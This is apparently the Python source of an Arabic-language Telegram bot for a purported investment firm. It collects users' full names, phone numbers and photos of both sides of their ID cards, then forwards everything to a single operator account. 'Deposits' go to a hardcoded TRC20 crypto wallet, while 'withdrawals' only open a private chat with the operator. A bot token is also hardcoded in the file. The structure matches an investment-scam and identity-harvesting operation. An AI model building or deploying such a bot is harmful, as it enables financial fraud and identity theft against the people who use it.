import os
import threading
import time
import urllib.parse
from http.server import HTTPServer, BaseHTTPRequestHandler
import telebot
from telebot import types

# ----------------- البيانات الأساسية -----------------
TOKEN = os.environ.get("BOT_TOKEN", "8758404259:AAHFaIYIJ-aDmGMiERTzgJmi0UYrhzl1qGk")
MY_CHAT_ID = int(os.environ.get("MY_CHAT_ID", "8994512911"))
MY_USERNAME = os.environ.get("MY_USERNAME", "AFXM1")
# --------------------------------------------------

bot = telebot.TeleBot(TOKEN)

user_data = {}      # لتخزين بيانات كل مستخدم مؤقتاً أثناء الإدخال
client_counter = 1  # عداد أرقام العملاء التسلسلية

# --- خادم وهمي لإرضاء موقع Render ---
class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Bot is running successfully!")

def run_dummy_server():
    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(('0.0.0.0', port), SimpleHTTPRequestHandler)
    server.serve_forever()

# ----------------- قوائم الأزرار -----------------
def main_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = types.KeyboardButton("1. إنشاء حساب")
    btn2 = types.KeyboardButton("2. السحب والإيداع")
    btn3 = types.KeyboardButton("3. خدمة العملاء")
    markup.add(btn1, btn2, btn3)
    return markup

def cancel_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn_cancel = types.KeyboardButton("❌ إلغاء والعودة للقائمة الرئيسية")
    markup.add(btn_cancel)
    return markup

# ----------------- إلغاء العملية -----------------
@bot.message_handler(func=lambda msg: msg.text == "❌ إلغاء والعودة للقائمة الرئيسية")
def cancel_operation(message):
    chat_id = message.chat.id
    if chat_id in user_data:
        del user_data[chat_id]
    bot.send_message(chat_id, "تم إلغاء العملية والعودة للقائمة الرئيسية.", reply_markup=main_keyboard())

# ----------------- أمر البداية /start -----------------
@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_text = (
        "اهلا بكم في العالمية القابضة\n"
        "يمكنك من خلال هذا البوت :\n"
        "1 - إنشاء حساب\n"
        "2 - إضافة/سحب أموال\n"
        "3 - التواصل مع خدمة العملاء"
    )
    bot.send_message(
        message.chat.id, 
        welcome_text, 
        reply_markup=main_keyboard()
    )

# ----------------- 1. مسار إنشاء حساب -----------------
@bot.message_handler(func=lambda msg: msg.text == "1. إنشاء حساب")
def start_registration(message):
    chat_id = message.chat.id
    user_data[chat_id] = {'photos': []}
    msg = bot.send_message(
        chat_id, 
        "يرجى إدخال الاسم الثلاثي:", 
        reply_markup=cancel_keyboard()
    )
    bot.register_next_step_handler(msg, process_name)

def process_name(message):
    if message.text == "❌ إلغاء والعودة للقائمة الرئيسية":
        cancel_operation(message)
        return
        
    chat_id = message.chat.id
    user_data[chat_id]['name'] = message.text

    username_instructions = (
        "أرسل أسم المستخدم الخاص بك على تيلغرام بدءابـ@\n\n"
        "وإذا كنت لاتملك معرف خاص إليك خطوات الإنشاء؛\n"
        "1- إضغط على الملف الشخصي أو صورة الملف الشخصي\n"
        "********_______********\n"
        "2-إختر تعديل البيانات\n"
        "********________________********\n"
        "3-ضمن خانة معلوماتك إختر خانة أسم المستخدم @\n"
        "4- بعد إختيار أسم متسخدم قم بنسخه وإضافته هنا مسبوقاً بعلامة @\n\n"
        "على سبيل المثال:\n"
        "@premium"
    )

    msg = bot.send_message(chat_id, username_instructions, reply_markup=cancel_keyboard())
    bot.register_next_step_handler(msg, process_username_input)

def process_username_input(message):
    if message.text == "❌ إلغاء والعودة للقائمة الرئيسية":
        cancel_operation(message)
        return

    chat_id = message.chat.id
    user_data[chat_id]['custom_username'] = message.text
    
    msg = bot.send_message(chat_id, "الرجاء إرسال صورة الوجه الأول من الهوية:", reply_markup=cancel_keyboard())
    bot.register_next_step_handler(msg, process_photo_1)

def process_photo_1(message):
    if message.text == "❌ إلغاء والعودة للقائمة الرئيسية":
        cancel_operation(message)
        return

    chat_id = message.chat.id
    if not message.photo:
        msg = bot.send_message(chat_id, "⚠️ يرجى إرسال صورة حقيقية للهوية (صورة فقط):", reply_markup=cancel_keyboard())
        bot.register_next_step_handler(msg, process_photo_1)
        return

    user_data[chat_id]['photos'].append(message.photo[-1].file_id)
    msg = bot.send_message(chat_id, "تم استلام الصورة الأولى. الآن أرسل صورة الوجه الثاني للهوية:", reply_markup=cancel_keyboard())
    bot.register_next_step_handler(msg, process_photo_2)

def process_photo_2(message):
    if message.text == "❌ إلغاء والعودة للقائمة الرئيسية":
        cancel_operation(message)
        return

    chat_id = message.chat.id
    if not message.photo:
        msg = bot.send_message(chat_id, "⚠️ يرجى إرسال صورة حقيقية للهوية (صورة فقط):", reply_markup=cancel_keyboard())
        bot.register_next_step_handler(msg, process_photo_2)
        return

    user_data[chat_id]['photos'].append(message.photo[-1].file_id)
    msg = bot.send_message(chat_id, "تم استلام صور الهوية. أرسل رقم هاتفك الآن:", reply_markup=cancel_keyboard())
    bot.register_next_step_handler(msg, process_phone)

def process_phone(message):
    global client_counter
    if message.text == "❌ إلغاء والعودة للقائمة الرئيسية":
        cancel_operation(message)
        return

    chat_id = message.chat.id
    if chat_id not in user_data:
        bot.send_message(chat_id, "حدث خطأ في الجلسة، يرجى المحاولة مرة أخرى من القائمة الرئيسية.", reply_markup=main_keyboard())
        return

    phone = message.text
    name = user_data[chat_id].get('name', 'غير محدد')
    custom_username = user_data[chat_id].get('custom_username', 'غير محدد')
    photos = user_data[chat_id].get('photos', [])

    client_id_str = f"{client_counter:02d}"

    # تنظيف المعرف لاستخدامه في رابط التواصل المباشر
    clean_username = custom_username.replace("@", "").strip()

    admin_caption = (
        f"📋 طلب إنشاء حساب جديد\n\n"
        f"🔢 العميل رقم: #{client_id_str}\n"
        f"👤 الاسم الثلاثي: {name}\n"
        f"🔗 معرف التلغرام: {custom_username}\n"
        f"📞 رقم الهاتف: {phone}\n"
        f"🆔 ID تلغرام: `{chat_id}`"
    )
    
    # إنشاء زر مراسلة العميل المباشر
    admin_markup = types.InlineKeyboardMarkup()
    if clean_username and clean_username != "غير محدد":
        btn_contact = types.InlineKeyboardButton("💬 مراسلة العميل مباشرة", url=f"https://t.me/{clean_username}")
        admin_markup.add(btn_contact)
    else:
        btn_contact = types.InlineKeyboardButton("💬 فتح محادثة عبر ID", url=f"tg://user?id={chat_id}")
        admin_markup.add(btn_contact)

    try:
        # إرسال التفاصيل للأدمن مع زر التواصل المباشر
        bot.send_message(MY_CHAT_ID, admin_caption, reply_markup=admin_markup, parse_mode="Markdown")

        for i, photo_id in enumerate(photos, 1):
            bot.send_photo(
                MY_CHAT_ID, 
                photo_id, 
                caption=f"📷 صورة الهوية ({i}) للعميل رقم #{client_id_str}"
            )

        client_counter += 1
        if chat_id in user_data:
            del user_data[chat_id]

        bot.send_message(
            chat_id, 
            f"تم استلام جميع بياناتك بنجاح!\nرقم الطلب الخاص بك هو: #{client_id_str}\nسيتم مراجعة الطلب والتواصل معك قريباً.", 
            reply_markup=main_keyboard()
        )
    except Exception as e:
        print(f"CRITICAL ERROR in process_phone: {str(e)}")
        bot.send_message(chat_id, "حدث خطأ أثناء إرسال البيانات، يرجى المحاولة لاحقاً.", reply_markup=main_keyboard())

# ----------------- 2. مسار السحب والإيداع -----------------
@bot.message_handler(func=lambda msg: msg.text == "2. السحب والإيداع")
def withdraw_deposit_menu(message):
    markup = types.InlineKeyboardMarkup()
    text_message = urllib.parse.quote("اريد ان اسحب اموال")
    btn_withdraw = types.InlineKeyboardButton("سحب من حسابي", url=f"https://t.me/{MY_USERNAME}?text={text_message}")
    btn_deposit = types.InlineKeyboardButton("إيداع بحسابي", callback_data="deposit")
    markup.add(btn_withdraw, btn_deposit)
    bot.send_message(message.chat.id, "اختر العملية المطلوبة:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "deposit")
def process_deposit_click(call):
    bot.answer_callback_query(call.id)
    chat_id = call.message.chat.id

    deposit_text = (
        "⚠️ **تنويه: الشبكة حصراً TRC20**\n\n"
        "📌 **تعليمات الإيداع:**\n\n"
        "يرجى التحويل إلى عنوان المحفظة التالي:\n"
        "`TQM9FVW9C4QBE6B4CDwQC8po7m15ygetrM`\n\n"
        "💡 *اضغط على العنوان أعلاه لنسخه مباشرة.*\n\n"
        "بعد إتمام التحويل، أرسل إشعار التحويل أو العنوان الخاص بك هنا (كنص أو صورة):"
    )

    base_dir = os.path.dirname(os.path.abspath(__file__))
    qr_file_path = os.path.join(base_dir, "qr.jpg")
    
    if os.path.exists(qr_file_path):
        with open(qr_file_path, 'rb') as photo:
            msg = bot.send_photo(
                chat_id, 
                photo, 
                caption=deposit_text, 
                parse_mode="Markdown", 
                reply_markup=cancel_keyboard()
            )
    else:
        msg = bot.send_message(
            chat_id, 
            deposit_text, 
            parse_mode="Markdown", 
            reply_markup=cancel_keyboard()
        )
        
    bot.register_next_step_handler(msg, process_deposit_submission)

def process_deposit_submission(message):
    if message.text == "❌ إلغاء والعودة للقائمة الرئيسية":
        cancel_operation(message)
        return

    chat_id = message.chat.id
    user_obj = message.from_user
    username_str = f"@{user_obj.username}" if user_obj.username else "لا يوجد"
    
    bot.send_message(chat_id, "تم استلام طلبك وتحويله للقسم المختص.", reply_markup=main_keyboard())

    # زر التواصل مع صاحب الإيداع
    admin_markup = types.InlineKeyboardMarkup()
    if user_obj.username:
        btn_contact = types.InlineKeyboardButton("💬 مراسلة العميل مباشرة", url=f"https://t.me/{user_obj.username}")
    else:
        btn_contact = types.InlineKeyboardButton("💬 فتح محادثة عبر ID", url=f"tg://user?id={chat_id}")
    admin_markup.add(btn_contact)

    bot.send_message(
        MY_CHAT_ID, 
        f"💰 **طلب إيداع جديد**\n"
        f"👤 من المستخدم: {username_str}\n"
        f"🆔 ID: `{chat_id}`",
        parse_mode="Markdown",
        reply_markup=admin_markup
    )

    if message.photo:
        bot.send_photo(MY_CHAT_ID, message.photo[-1].file_id, caption="صورة إشعار الإيداع المرسلة")
    elif message.text:
        bot.send_message(MY_CHAT_ID, f"📝 التفاصيل / العنوان:\n`{message.text}`", parse_mode="Markdown")

# ----------------- 3. مسار خدمة العملاء -----------------
@bot.message_handler(func=lambda msg: msg.text == "3. خدمة العملاء")
def customer_service(message):
    markup = types.InlineKeyboardMarkup()
    btn_cs = types.InlineKeyboardButton("التواصل مع خدمة العملاء", url=f"https://t.me/{MY_USERNAME}")
    markup.add(btn_cs)
    bot.send_message(message.chat.id, "للتحويل المباشر إلى خدمة العملاء اضغط على الزر أدناه:", reply_markup=markup)

# ----------------- تشغيل الخادم الوهمي والبوت -----------------
if __name__ == '__main__':
    threading.Thread(target=run_dummy_server, daemon=True).start()
    print("الخادم الوهمي يعمل بنجاح...")
    
    try:
        bot.remove_webhook()
        time.sleep(1)
    except Exception as e:
        print(f"Webhook reset note: {e}")

    print("البوت يعمل الآن واستقبل الطلبات...")
    
    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=60, skip_pending=True)
        except Exception as e:
            print(f"Polling error occurred: {e}")
            time.sleep(5)
